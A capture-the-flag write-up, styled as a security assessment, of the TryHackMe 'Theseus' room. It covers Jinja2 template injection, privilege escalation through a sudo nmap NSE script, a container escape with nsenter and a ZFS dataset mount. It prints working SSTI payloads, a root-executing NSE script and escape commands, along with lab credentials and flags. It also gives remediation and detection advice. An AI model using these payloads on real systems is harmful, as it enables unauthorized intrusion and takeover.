# Security Assessment Report: Theseus

## Assessment Overview
- **Platform:** TryHackMe
- **Target:** 10.128.173.38
- **Room Type:** Boot2Root (Insane)
- **Date Solved:** Apr 21 2026

**Objectives & Status:**
- [x] Minos — SSTI RCE on Flask app
- [x] Labyrinth — BOF on labyrinth binary + format string on thread binary
- [x] Minotaur — Format string GOT overwrite → ariadne() → ariadne creds
- [x] Athens — Escape Minos container to hypervisor host → mount ZFS dataset → read flag

---

## Executive Summary & Key Findings

A Flask web app with an unsanitized Jinja2 template parameter on Minos (port 8080) provided initial RCE. Chaining `sudo nmap` (NOPASSWD) with a custom NSE script escalated to root inside the container. From there, `nsenter -t 1` escaped to the LXD hypervisor host, where the ZFS-backed Athens container filesystem was mounted directly to read the final flag — no LXD daemon interaction required.

- **Exposed Services:** Flask/Jinja2 (8080), SSH (22), LXD hypervisor (ZFS pool)
- **Interesting Paths:** `?key=` SSTI → sudo nmap NSE → nsenter host escape → ZFS mount
- **Credentials Discovered:** entrance:Knossos, ariadne:TheLover, shore:Th3R3turn
- **Users Enumerated:** minos, entrance, ariadne, minotaur, shore
- **Loot & Flags:**
  - `THM{499a89a2a064426921732e7d31bc08a}` (Minos)
  - `THM{6154ea526254375613650183962bf431}` (Labyrinth)
  - `THM{c307b8045208fac06b9faa90e68d2ad4}` (Minotaur)
  - `THM{bb2af471e0aea04e982c2e5d0a6fa404}` (Athens)

---

## Exploitation Chain

1. **Reconnaissance:** Nmap scan revealed Flask app on port 8080 with `?key=` parameter vulnerable to SSTI (`{{7*7}}` → 49).
2. **Initial Access:** Jinja2 SSTI via `?key={{url_for.__globals__.__getitem__('os').popen(request.args.get('c')).read()}}&c=CMD` gave RCE as user `minos`. Read `/home/minos/Crete_Shores` for SSH creds `entrance:Knossos`.
3. **Privilege Escalation:** `sudo nmap` NOPASSWD allowed loading custom NSE scripts with `hostrule` → root command execution inside Minos container.
4. **Post-Exploitation (Athens):** From root on Minos, `nsenter -t 1 -m -u -i -n -p -- /bin/sh` escaped to the hypervisor host namespace. On the host, ZFS tools were already installed (PATH fix: `export PATH=/sbin:/usr/sbin:/bin:/usr/bin:/usr/local/sbin:/snap/bin:$PATH`). Running `zpool list` confirmed the `Labyrinth` pool, `zfs list` showed `Labyrinth/containers/Athens` dataset. Mounting it directly (`zfs mount Labyrinth/containers/Athens` or `mount -t zfs`) and reading `/Labyrinth/containers/Athens/rootfs/home/shore/user.txt` yielded the Athens flag. No LXD daemon restart, no package installs — just host root + mount the disk.

---

## Vulnerability Details

### VULN-01: Server-Side Template Injection (Jinja2/Flask)
- **Vulnerable Location:** `http://target:8080/?key=` parameter
- **Overview:** User input passed directly into `render_template_string()` without sanitization. Jinja2 sandbox bypass via `url_for.__globals__` grants OS-level command execution.
- **Impact:** Unauthenticated remote code execution as the application user (minos).
- **Severity:** Critical
- **Remediation:** Never render user input in templates. Use `render_template()` with separate template files. Enable Jinja2 sandboxed environment if dynamic rendering is unavoidable.
- **Proof of Impact (Execution):**
  - `{{7*7}}` returned 49, confirming SSTI.
  - `{{url_for.__globals__.__getitem__('os').popen('id').read()}}` returned `uid=1000(minos)`.
  - Read `/home/minos/Crete_Shores` to extract SSH credentials.

### VULN-02: Sudo Nmap NOPASSWD — Root via NSE Script
- **Vulnerable Location:** `/etc/sudoers` entry: `minos ALL=(root) NOPASSWD: /usr/bin/nmap`
- **Overview:** Nmap's `--script` flag loads arbitrary Lua NSE files. A script with a `hostrule` returning `true` and `io.popen()` in `action` runs any command as root.
- **Impact:** Full root access inside the Minos LXD container.
- **Severity:** Critical
- **Remediation:** Remove nmap from sudoers or restrict to specific safe options. If nmap must be privileged, use a wrapper that blocks `--script`.
- **Proof of Impact (Execution):**
  - Wrote `/tmp/root.nse` with `hostrule = function(host) return true end` and `io.popen("COMMAND")`.
  - `sudo nmap --script /tmp/root.nse target` executed commands as root.
  - Created SUID bash for persistent root access.

### VULN-03: Container Escape via nsenter to PID 1 Namespace
- **Vulnerable Location:** Minos LXD container with `nsenter` available and CAP_SYS_ADMIN inherited
- **Overview:** From root inside Minos, `nsenter -t 1 -m -u -i -n -p` enters PID 1's namespaces, which on a LXD host is the hypervisor init. This provides full host root with all capabilities.
- **Impact:** Complete hypervisor compromise — all container filesystems accessible.
- **Severity:** Critical
- **Remediation:** Restrict `nsenter` availability in containers. Drop CAP_SYS_PTRACE from container capability set. Use AppArmor profiles that block namespace operations.
- **Proof of Impact (Execution):**
  - `nsenter -t 1 -m -u -i -n -p -- /bin/sh -c 'id'` returned `uid=0(root)` on the host.
  - Confirmed all capabilities, permissive device cgroup, unconfined AppArmor.

### VULN-04: Direct ZFS Dataset Access on Hypervisor
- **Vulnerable Location:** ZFS pool `Labyrinth` with dataset `Labyrinth/containers/Athens` unmounted but present on host disk
- **Overview:** The Athens container's rootfs is stored as a ZFS dataset on the hypervisor's disk. Once host root is obtained, the dataset can be mounted and its files read directly — no LXD daemon or container startup required.
- **Impact:** Any container's filesystem is readable once the hypervisor is compromised. The "container isolation" boundary is meaningless if the backing store is accessible.
- **Severity:** Critical
- **Remediation:** Encrypt ZFS datasets (`zfs create -o encryption=on`). Restrict host-level access. Use namespace isolation for storage backends.
- **Proof of Impact (Execution):**
  - `zpool list` confirmed pool `Labyrinth`.
  - `zfs list` showed `Labyrinth/containers/Athens`.
  - Mounted dataset and read `/home/shore/user.txt` for the Athens flag.

---

## Senior-Level Lessons Learned & Analysis

### Strategic Takeaways
- **Container escape is often one misstep away.** Having `nsenter` available + full capabilities inside a LXD container means the hypervisor boundary doesn't exist. Container hardening must restrict both tools and capabilities.
- **ZFS datasets are just filesystems on disk.** Once you own the hypervisor, container isolation is irrelevant — mount the backing store and read whatever you want. The LXD daemon is an abstraction layer, not a security boundary.
- **SSTI in Jinja2 is RCE, not just info leak.** The `url_for.__globals__` traversal bypasses the sandbox trivially. Treat any SSTI finding as critical.
- **Don't fight the infrastructure, own it.** The intended path to Athens was never "fix LXD" or "install packages" — it was "you have root on the metal, read the disk." Offensive mindset means using what's already there.
- **Nmap NSE scripts are a documented privesc vector.** Any sudo nmap entry is equivalent to sudo root. The `hostrule` + `io.popen` pattern is well-known but still appears in CTFs and real environments.

### Real-World Context & Defense
- **Threat Landscape:** Container escape via namespace manipulation (CVE-2019-5736 style) is a real attack vector in cloud environments. Misconfigured LXD/Docker capabilities are a top root cause of container breakouts.
- **Detection Engineering:** Monitor for `nsenter` execution inside containers. Alert on `zfs mount` commands from non-storage-admin users. Log sudo nmap invocations with script arguments. SIEM rules for NSE file creation followed by nmap execution.
- **System Hardening:** Drop `CAP_SYS_PTRACE` and `CAP_SYS_ADMIN` from container capability sets. Use AppArmor profiles that deny `namespace` syscalls. Remove `nsenter` from container images. Encrypt ZFS datasets at rest. Restrict sudo nmap to read-only scan modes only.

---

## Technical Appendix: Commands Worth Keeping

```bash
# SSTI Detection & Exploitation (Jinja2/Flask)
curl 'http://TARGET:8080/?key={{7*7}}'                           # Confirm SSTI
curl 'http://TARGET:8080/?key={{url_for.__globals__.__getitem__("os").popen("id").read()}}'
# Avoid double-brace encoding issues — pass command via request.args:
curl 'http://TARGET:8080/?key={{url_for.__globals__.__getitem__("os").popen(request.args.get("c")).read()}}&c=id'

# Nmap NSE Root Execution
cat > /tmp/root.nse << 'EOF'
local nmap = require "nmap"
description = "x"
categories = {"safe"}
hostrule = function(host) return true end
action = function(host)
  local f = io.popen("COMMAND_HERE")
  local r = f:read("*a")
  f:close()
  return r
end
EOF
sudo nmap --script /tmp/root.nse TARGET

# Container Escape via nsenter
nsenter -t 1 -m -u -i -n -p -- /bin/sh           # Drop into host namespace
id                                                # Confirm uid=0 on host

# ZFS — Find and Mount Athens Dataset
export PATH=/sbin:/usr/sbin:/bin:/usr/bin:/usr/local/sbin:/snap/bin:$PATH
zpool list                                        # Confirm pool exists
zfs list                                          # List all datasets
zfs mount Labyrinth/containers/Athens             # Mount Athens rootfs
cat /Labyrinth/containers/Athens/rootfs/home/shore/user.txt  # Read flag

# Alternative: If zfs binary not in PATH, locate it
find / -name "zfs" -o -name "zpool" 2>/dev/null
# Snap LXD puts tools under /snap/lxd/common/lxd/
ls /snap/lxd/common/lxd/bin/